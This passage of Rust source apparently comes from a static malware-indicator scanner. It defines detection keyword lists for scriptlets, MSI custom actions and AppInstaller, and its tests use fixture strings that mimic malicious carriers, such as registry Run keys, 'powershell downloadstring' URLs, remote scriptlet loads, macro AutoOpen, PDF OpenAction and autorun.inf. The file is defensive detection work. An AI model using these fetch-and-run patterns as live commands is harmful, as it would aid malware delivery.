            "<jar ",
            " jar href",
            "<extension ",
            "java-vm-args",
            "main-class",
        ],
        cancellation_checkpoint,
    )
}

fn windows_scriptlet_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "<scriptlet",
            "scriptlet",
            "<registration",
            "<public",
            "<script ",
            "language=\"jscript",
            "language=\"vbscript",
            "regsvr32",
            "scrobj.dll",
            "script:",
        ],
        cancellation_checkpoint,
    )
}

fn windows_installer_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "windows installer",
            "msiexec",
            "installexecutesequence",
            "installuisequence",
            "productcode",
            "packagecode",
            "msipatchmetadata",
        ],
        cancellation_checkpoint,
    )
}

fn windows_installer_custom_actions(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "customaction",
            "custom action",
            "wixquietexec",
            "wixsilentexec",
            "quietexec",
            "deferred",
            "commit custom",
            "rollback custom",
        ],
        cancellation_checkpoint,
    )
}

fn windows_appinstaller_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "<appinstaller",
            "appinstaller",
            "mainpackage",
            "<mainbundle",
            "packageuri",
            "uri=\"",
            "schemas.microsoft.com/appx/appinstaller",
        ],
        cancellation_checkpoint,
    )
}

fn has_compound_file_binary_header(bytes: &[u8]) -> bool {
    bytes.starts_with(&[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn non_archive_static_cancellation_interrupts_string_indicator_substeps() {
        let bytes = b"https://example.invalid/readme.txt powershell benign";
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 7 {
                anyhow::bail!("benign string-indicator cancellation")
            }
            Ok(())
        };

        let error = extract_indicators_with_cancellation(bytes, &mut checkpoint)
            .expect_err("string cancellation must abort indicator extraction");

        assert!(error
            .to_string()
            .contains("benign string-indicator cancellation"));
        assert_eq!(checks, 7);
    }

    #[test]
    fn static_text_normalization_interrupts_string_input_chunks_before_evidence() {
        let bytes =
            vec![b'A'; crate::signatures::text::TEXT_NORMALIZATION_CANCELLATION_CHUNK_BYTES * 3];
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 3 {
                anyhow::bail!("benign static string normalization cancellation")
            }
            Ok(())
        };

        let error = extract_indicators_with_cancellation(&bytes, &mut checkpoint)
            .expect_err("string normalization cancellation must abort before indicators");

        assert!(error
            .to_string()
            .contains("benign static string normalization cancellation"));
        assert_eq!(checks, 3);
    }

    #[test]
    fn static_term_search_interrupts_string_term_chunks_before_evidence() {
        let text = "a".repeat(crate::signatures::search::SEARCH_CANCELLATION_CHUNK_CANDIDATES * 3);
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign string term-search cancellation")
            }
            Ok(())
        };

        let error = count_terms_with_cancellation(&text, &["zz"], &mut checkpoint)
            .expect_err("string term cancellation must abort before evidence");

        assert!(error
            .to_string()
            .contains("benign string term-search cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn static_reference_cancellation_interrupts_url_marker_search_before_evidence() {
        let text = "a".repeat(STRING_REFERENCE_CANCELLATION_CHUNK_BYTES * 3);
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 3 {
                anyhow::bail!("benign URL marker-search cancellation")
            }
            Ok(())
        };

        let error = match embedded_url_counts_with_cancellation(&text, &mut checkpoint) {
            Ok(_) => panic!("URL marker-search cancellation must abort before evidence"),
            Err(error) => error,
        };

        assert!(error
            .to_string()
            .contains("benign URL marker-search cancellation"));
        assert_eq!(checks, 3);
    }

    #[test]
    fn static_reference_cancellation_interrupts_url_body_before_evidence() {
        let text = format!(
            "http://safe.invalid/{}.exe",
            "a".repeat(STRING_REFERENCE_CANCELLATION_CHUNK_BYTES * 3)
        );
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 5 {
                anyhow::bail!("benign URL body cancellation")
            }
            Ok(())
        };

        let error = match embedded_url_counts_with_cancellation(&text, &mut checkpoint) {
            Ok(_) => panic!("URL body cancellation must abort before evidence"),
            Err(error) => error,
        };

        assert!(error.to_string().contains("benign URL body cancellation"));
        assert_eq!(checks, 5);
    }

    #[test]
    fn static_reference_cancellation_interrupts_network_marker_search_before_evidence() {
        let text = "a".repeat(STRING_REFERENCE_CANCELLATION_CHUNK_BYTES * 3);
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 3 {
                anyhow::bail!("benign network marker-search cancellation")
            }
            Ok(())
        };

        let error = remote_network_executable_path_count_with_cancellation(&text, &mut checkpoint)
            .expect_err("network marker-search cancellation must abort before evidence");

        assert!(error
            .to_string()
            .contains("benign network marker-search cancellation"));
        assert_eq!(checks, 3);
    }

    #[test]
    fn static_reference_cancellation_interrupts_network_body_before_evidence() {
        let text = format!(
            "\\\\fileserver\\share\\{}.exe",
            "a".repeat(STRING_REFERENCE_CANCELLATION_CHUNK_BYTES * 3)
        );
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 5 {
                anyhow::bail!("benign network body cancellation")
            }
            Ok(())
        };

        let error = remote_network_executable_path_count_with_cancellation(&text, &mut checkpoint)
            .expect_err("network body cancellation must abort before evidence");

        assert!(error
            .to_string()
            .contains("benign network body cancellation"));
        assert_eq!(checks, 5);
    }

    #[test]
    fn static_reference_cancellation_preserves_unicode_delimiter_across_chunks() {
        let prefix = "a".repeat(STRING_REFERENCE_CANCELLATION_CHUNK_BYTES - 1);
        let text = format!("{prefix}\u{2003}ordinary");
        let mut never_cancel = || Ok(());

        assert_eq!(
            reference_end_with_cancellation(&text, &mut never_cancel).unwrap(),
            prefix.len()
        );
    }

    #[test]
    fn static_structured_indicator_cancellation_interrupts_carrier_marker_chunks() {
        let text = "a".repeat(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES * 3);
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign carrier marker cancellation")
            }
            Ok(())
        };

        let error = is_web_document_text_with_cancellation(&text, &mut checkpoint)
            .expect_err("carrier marker cancellation must abort classification");

        assert!(error
            .to_string()
            .contains("benign carrier marker cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn static_structured_indicator_cancellation_interrupts_ip_candidate_chunks() {
        let text = "1".repeat(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES * 3);
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign IP candidate chunk cancellation")
            }
            Ok(())
        };

        let error = embedded_ip_count_with_cancellation(&text, &mut checkpoint)
            .expect_err("IP candidate cancellation must abort counting");

        assert!(error
            .to_string()
            .contains("benign IP candidate chunk cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn static_structured_indicator_cancellation_interrupts_autorun_line_chunks() {
        let text = format!(
            "[autorun]\nopen={}.exe",
            "a".repeat(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES * 3)
        );
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 3 {
                anyhow::bail!("benign autorun line cancellation")
            }
            Ok(())
        };

        let error = autorun_inf_executable_commands_with_cancellation(&text, &mut checkpoint)
            .expect_err("autorun line cancellation must abort before a count");

        assert!(error
            .to_string()
            .contains("benign autorun line cancellation"));
        assert_eq!(checks, 3);
    }

    #[test]
    fn static_structured_indicator_cancellation_interrupts_command_token_chunks() {
        let value = format!(
            "{}.exe",
            "a".repeat(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES * 3)
        );
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign command token cancellation")
            }
            Ok(())
        };

        let error = command_value_has_executable_or_script_reference_with_cancellation(
            &value,
            &mut checkpoint,
        )
        .expect_err("command token cancellation must abort classification");

        assert!(error
            .to_string()
            .contains("benign command token cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn static_structured_indicator_cancellation_interrupts_optical_marker_chunks() {
        let bytes = vec![b'a'; STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES * 3];
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign optical marker cancellation")
            }
            Ok(())
        };

        let error = looks_like_optical_disk_image_with_cancellation(&bytes, &mut checkpoint)
            .expect_err("optical marker cancellation must abort classification");

        assert!(error
            .to_string()
            .contains("benign optical marker cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn static_structured_indicator_cancellation_interrupts_email_line_chunks() {
        let text = format!(
            "content-type: application/octet-stream; name=\"{}.exe\"",
            "a".repeat(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES * 3)
        );
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign email line cancellation")
            }
            Ok(())
        };

        let error = email_executable_attachment_lines_with_cancellation(&text, &mut checkpoint)
            .expect_err("email line cancellation must abort before a count");

        assert!(error.to_string().contains("benign email line cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn static_structured_indicator_cancellation_interrupts_query_path_chunks() {
        let path = "a".repeat(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES * 3);
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign query path cancellation")
            }
            Ok(())
        };

        let error = path_before_query_or_fragment_with_cancellation(&path, &mut checkpoint)
            .expect_err("query path cancellation must abort classification");

        assert!(error.to_string().contains("benign query path cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn static_structured_indicator_cancellation_interrupts_network_host_chunks() {
        let path = format!(
            "\\\\{}",
            "a".repeat(STRING_STRUCTURED_CANCELLATION_CHUNK_BYTES * 3)
        );
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign network host cancellation")
            }
            Ok(())
        };

        let error = is_remote_network_path_with_cancellation(&path, &mut checkpoint)
            .expect_err("network host cancellation must abort classification");

        assert!(error
            .to_string()
            .contains("benign network host cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn static_structured_indicator_cancellation_preserves_structured_semantics() {
        let text = b"[autorun]\r\nopen=setup.exe /quiet\r\n\
From: support@example.invalid\r\nSubject: setup\r\nMIME-Version: 1.0\r\n\
Content-Disposition: attachment; filename=\"support.ps1\"\r\n\
https://example.invalid/readme.txt?download=payload.exe";
        let indicators = extract_indicators(text);
        let mut never_cancel = || Ok(());
        let fallible = extract_indicators_with_cancellation(text, &mut never_cancel)
            .expect("structured traversal must pass without cancellation");

        assert_eq!(fallible, indicators);
        assert_eq!(indicators.autorun_inf_executable_command_count, 1);
        assert_eq!(indicators.email_executable_attachment_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn non_archive_static_cancellation_streams_reference_counts_without_vectors() {
        let text = "https://example.invalid/readme.txt ".repeat(3000);
        let indicators = extract_indicators(text.as_bytes());

        assert_eq!(indicators.embedded_url_count, 3000);
        assert_eq!(indicators.remote_executable_url_count, 0);
        let source = include_str!("strings.rs");
        assert!(source.contains("embedded_url_counts_with_cancellation"));
        assert!(source.contains("remote_network_executable_path_count_with_cancellation"));
        let old_url_vector = ["fn embedded_urls(text: &str) -> ", "Vec<&str>"].concat();
        let old_path_vector = ["fn remote_network_paths(text: &str) -> ", "Vec<&str>"].concat();
        assert!(!source.contains(&old_url_vector));
        assert!(!source.contains(&old_path_vector));
    }

    #[test]
    fn non_archive_static_cancellation_preserves_string_wrapper_results() {
        let bytes = b"https://example.invalid/tool.exe 192.0.2.1 powershell";
        let wrapped = extract_indicators(bytes);
        let mut never_cancel = || Ok(());
        let fallible = extract_indicators_with_cancellation(bytes, &mut never_cancel)
            .expect("fallible string analysis must pass without cancellation");

        assert_eq!(wrapped, fallible);
    }

    #[test]
    fn non_archive_static_cancellation_interrupts_streamed_ip_candidates() {
        let text = "192.0.2.1 ".repeat(4096);
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign IP traversal cancellation")
            }
            Ok(())
        };

        let error = embedded_ip_count_with_cancellation(&text, &mut checkpoint)
            .expect_err("IP traversal cancellation must abort counting");

        assert!(error
            .to_string()
            .contains("benign IP traversal cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn string_indicators_count_registry_and_shortcut_carriers() {
        let indicators = extract_indicators(
            br#"
Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"Updater"="powershell https://example.invalid/update.ps1"
[InternetShortcut]
URL=https://example.invalid/setup.exe
IconFile=cmd.exe
"#,
        );

        assert_eq!(indicators.embedded_url_count, 2);
        assert_eq!(indicators.remote_executable_url_count, 2);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_network_executable_path_count, 0);
        assert_eq!(indicators.clickonce_marker_count, 0);
        assert_eq!(indicators.java_web_start_marker_count, 0);
        assert_eq!(indicators.windows_scriptlet_marker_count, 0);
        assert_eq!(indicators.windows_installer_marker_count, 0);
        assert_eq!(indicators.windows_installer_custom_action_count, 0);
        assert_eq!(indicators.windows_appinstaller_marker_count, 0);
        assert_eq!(indicators.remote_windows_app_package_url_count, 0);
        assert_eq!(indicators.macro_auto_run_count, 0);
        assert_eq!(indicators.rtf_external_object_count, 0);
        assert_eq!(indicators.pdf_active_content_count, 0);
        assert_eq!(indicators.web_document_active_content_count, 0);
        assert_eq!(indicators.registry_autorun_count, 1);
        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
        assert_eq!(indicators.email_executable_attachment_count, 0);
        assert!(indicators.script_host_reference_count >= 2);
    }

    #[test]
    fn ordinary_web_link_is_not_remote_executable_url() {
        let indicators =
            extract_indicators(b"[InternetShortcut]\nURL=https://example.invalid/readme.html");

        assert_eq!(indicators.embedded_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_network_executable_path_count, 0);
        assert_eq!(indicators.java_web_start_marker_count, 0);
        assert_eq!(indicators.windows_scriptlet_marker_count, 0);
        assert_eq!(indicators.windows_installer_marker_count, 0);
        assert_eq!(indicators.windows_installer_custom_action_count, 0);
        assert_eq!(indicators.macro_auto_run_count, 0);
        assert_eq!(indicators.rtf_external_object_count, 0);
        assert_eq!(indicators.pdf_active_content_count, 0);
        assert_eq!(indicators.web_document_active_content_count, 0);
        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
        assert_eq!(indicators.email_executable_attachment_count, 0);
    }

    #[test]
    fn utf16le_remote_executable_url_is_counted() {
        let mut bytes = Vec::new();
        for unit in "ShellLink target https://example.invalid/support.ps1 cmd.exe".encode_utf16() {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.embedded_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_network_executable_path_count, 0);
        assert_eq!(indicators.macro_auto_run_count, 0);
        assert!(indicators.script_host_reference_count >= 1);
    }

    #[test]
    fn clickonce_manifest_markers_and_remote_executable_are_counted() {
        let indicators = extract_indicators(
            br#"<assembly xmlns:asmv2="urn:schemas-microsoft-com:asm.v2">
<asmv2:deployment install="true">
<asmv2:deploymentProvider codebase="https://example.invalid/setup.exe" />
</asmv2:deployment>
</assembly>"#,
        );

        assert!(indicators.clickonce_marker_count >= 3);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
    }

    #[test]
    fn clickonce_appref_ms_remote_application_url_is_counted() {
        let indicators = extract_indicators(
            b"https://example.invalid/Support.application#Support, Culture=neutral",
        );

        assert_eq!(indicators.remote_clickonce_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.clickonce_marker_count, 0);
    }

    #[test]
    fn java_web_start_markers_and_remote_jar_are_counted() {
        let indicators = extract_indicators(
            br#"<jnlp spec="1.0+" codebase="https://example.invalid/app/">
<information><title>Support</title></information>
<resources><jar href="https://example.invalid/app/support.jar" /></resources>
<application-desc main-class="com.example.Support" />
</jnlp>"#,
        );

        assert!(indicators.java_web_start_marker_count >= 3);
        assert_eq!(indicators.remote_java_web_start_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.clickonce_marker_count, 0);
    }

    #[test]
    fn java_web_start_document_link_without_archive_is_not_payload_url() {
        let indicators = extract_indicators(
            br#"<jnlp spec="1.0+"><information href="https://example.invalid/readme.html" /></jnlp>"#,
        );

        assert!(indicators.java_web_start_marker_count >= 1);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_scriptlet_markers_and_remote_script_are_counted() {
        let indicators = extract_indicators(
            br#"<scriptlet>
<registration progid="Support.Loader" />
<script language="JScript">
var x = GetObject("script:https://example.invalid/loader.sct");
</script>
</scriptlet>"#,
        );

        assert!(indicators.windows_scriptlet_marker_count >= 3);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn windows_scriptlet_document_link_without_payload_is_not_payload_url() {
        let indicators = extract_indicators(
            br#"<scriptlet><registration progid="Docs.Viewer" /><script language="JScript">var help="https://example.invalid/readme.html";</script></scriptlet>"#,
        );

        assert!(indicators.windows_scriptlet_marker_count >= 2);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_installer_custom_action_markers_are_counted() {
        let mut bytes = vec![0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1];
        bytes.extend_from_slice(
            b"Windows Installer CustomAction WixQuietExec powershell downloadstring https://example.invalid/setup.msp",
        );

        let indicators = extract_indicators(&bytes);

        assert!(indicators.windows_installer_marker_count >= 2);
        assert!(indicators.windows_installer_custom_action_count >= 2);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert!(indicators.script_host_reference_count >= 1);
        assert!(indicators.suspicious_string_count >= 1);
    }

    #[test]
    fn windows_installer_document_link_without_custom_action_is_not_custom_action() {
        let indicators = extract_indicators(
            b"Windows Installer ProductCode https://example.invalid/readme.html",
        );

        assert!(indicators.windows_installer_marker_count >= 2);
        assert_eq!(indicators.windows_installer_custom_action_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_appinstaller_manifest_and_remote_package_are_counted() {
        let indicators = extract_indicators(
            br#"<AppInstaller Uri="https://example.invalid/app.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Support" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/packages/support.msix" />
</AppInstaller>"#,
        );

        assert!(indicators.windows_appinstaller_marker_count >= 4);
        assert_eq!(indicators.remote_windows_app_package_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_appinstaller_document_link_without_package_is_not_payload_url() {
        let indicators = extract_indicators(
            br#"<AppInstaller Uri="https://example.invalid/app.appinstaller"
    xmlns="http://schemas.microsoft.com/appx/appinstaller/2021">
  <MainPackage Name="Example.Support" Version="1.0.0.0"
      Publisher="CN=Example" Uri="https://example.invalid/readme.html" />
</AppInstaller>"#,
        );

        assert!(indicators.windows_appinstaller_marker_count >= 4);
        assert_eq!(indicators.remote_windows_app_package_url_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn utf16le_unc_executable_path_is_counted() {
        let mut bytes = Vec::new();
        for unit in r"ShellLink target \\fileserver\share\support.ps1".encode_utf16() {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.remote_network_executable_path_count, 1);
    }

    #[test]
    fn ordinary_unc_document_path_is_not_counted() {
        let indicators = extract_indicators(br"\\fileserver\share\readme.txt");

        assert_eq!(indicators.remote_network_executable_path_count, 0);
    }

    #[test]
    fn local_file_url_executable_path_is_not_remote_network_path() {
        let indicators = extract_indicators(b"file:///C:/Users/Public/support.exe");

        assert_eq!(indicators.remote_network_executable_path_count, 0);
    }

    #[test]
    fn remote_file_url_executable_path_is_counted() {
        let indicators = extract_indicators(b"file://fileserver/share/support.exe");

        assert_eq!(indicators.remote_network_executable_path_count, 1);
    }

    #[test]
    fn macro_auto_run_terms_are_counted() {
        let indicators = extract_indicators(
            b"Sub AutoOpen()\nEnd Sub\nPrivate Sub Document_Open()\nEnd Sub\nWorkbook_Open",
        );

        assert_eq!(indicators.macro_auto_run_count, 3);
    }

    #[test]
    fn utf16le_macro_auto_run_terms_are_counted() {
        let mut bytes = Vec::new();
        for unit in "Sub AutoOpen(): powershell https://example.invalid/payload.ps1".encode_utf16()
        {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.macro_auto_run_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert!(indicators.script_host_reference_count >= 1);
    }

    #[test]
    fn rtf_external_object_terms_are_counted() {
        let indicators = extract_indicators(
            br"{\rtf1{\object\objautlink\objupdate file://fileserver/share/support.vbs}{\field{\*\fldinst INCLUDEPICTURE https://example.invalid/payload.ps1}}}",
        );

        assert!(indicators.rtf_external_object_count >= 4);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.remote_network_executable_path_count, 1);
    }

    #[test]
    fn ordinary_object_words_outside_rtf_are_not_rtf_object_terms() {
        let indicators =
            extract_indicators(b"object field includepicture https://example.invalid/payload.ps1");

        assert_eq!(indicators.rtf_external_object_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn pdf_active_content_terms_are_counted() {
        let indicators = extract_indicators(
            b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.launchURL('https://example.invalid/payload.js')) >> >>\nendobj",
        );

        assert!(indicators.pdf_active_content_count >= 3);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn ordinary_active_words_outside_pdf_are_not_pdf_active_content() {
        let indicators =
            extract_indicators(b"/OpenAction /JavaScript https://example.invalid/payload.js");

        assert_eq!(indicators.pdf_active_content_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn web_document_active_content_terms_are_counted() {
        let indicators = extract_indicators(
            br#"<!doctype html><html><script>const u='https://example.invalid/payload.js'; const a=document.createElement('a'); a.download='payload.js';</script></html>"#,
        );

        assert!(indicators.web_document_active_content_count >= 2);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn ordinary_active_words_outside_web_document_are_not_web_document_active_content() {
        let indicators =
            extract_indicators(b"<script>javascript: atob('x') https://example.invalid/payload.js");

        assert_eq!(indicators.web_document_active_content_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn autorun_inf_executable_commands_are_counted() {
        let indicators = extract_indicators(
            br#"
[autorun]
open=support.exe /quiet
shellexecute=file://fileserver/share/support.vbs
shell\open\command=cmd.exe /c support.cmd
"#,
        );

        assert_eq!(indicators.autorun_inf_executable_command_count, 3);
        assert_eq!(indicators.remote_network_executable_path_count, 1);
        assert!(indicators.script_host_reference_count >= 1);
    }

    #[test]
    fn ordinary_inf_text_without_autorun_section_is_not_autorun_command() {
        let indicators = extract_indicators(
            br#"
[version]
signature="$windows nt$"
open=support.exe
"#,
        );

        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
    }

    #[test]
    fn autorun_inf_document_link_is_not_executable_command() {
        let indicators = extract_indicators(
            br#"
[autorun]
open=readme.txt
shellexecute=https://example.invalid/readme.html
"#,
        );

        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn disk_image_autorun_executable_is_counted() {
        let mut bytes = vec![0u8; 32 * 1024];
        bytes.extend_from_slice(b"CD001");
        bytes.extend_from_slice(
            b"\0AUTORUN.INF\0[autorun]\0open=setup.exe\0shell\\open\\command=runme.cmd\0",
        );

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.disk_image_autorun_executable_count, 1);
    }

    #[test]
    fn ordinary_iso_text_without_disk_marker_is_not_disk_image_autorun() {
        let indicators =
            extract_indicators(b"autorun.inf [autorun] open=setup.exe without image marker");

        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
    }

    #[test]
    fn disk_image_autorun_document_link_is_not_executable() {
        let mut bytes = vec![0u8; 32 * 1024];
        bytes.extend_from_slice(b"CD001");
        bytes.extend_from_slice(b"\0AUTORUN.INF\0[autorun]\0open=readme.pdf\0");

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
    }

    #[test]
    fn email_executable_attachment_names_are_counted() {
        let indicators = extract_indicators(
            br#"From: billing@example.invalid
Subject: invoice
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b"

--b
Content-Type: application/octet-stream; name="invoice.exe"
Content-Disposition: attachment; filename="invoice.exe"

placeholder
--b--
"#,
        );

        assert_eq!(indicators.email_executable_attachment_count, 2);
    }

    #[test]
    fn ordinary_email_document_attachment_is_not_executable_attachment() {
        let indicators = extract_indicators(
            br#"From: docs@example.invalid
Subject: notes
MIME-Version: 1.0
Content-Type: text/plain; name="readme.txt"
Content-Disposition: attachment; filename="readme.txt"
"#,
        );

        assert_eq!(indicators.email_executable_attachment_count, 0);
    }

    #[test]
    fn attachment_words_outside_email_are_not_email_attachment_evidence() {
        let indicators = extract_indicators(
            br#"Content-Disposition: attachment; filename="invoice.exe"
MIME-Version: 1.0
"#,
        );

        assert_eq!(indicators.email_executable_attachment_count, 0);
    }
}
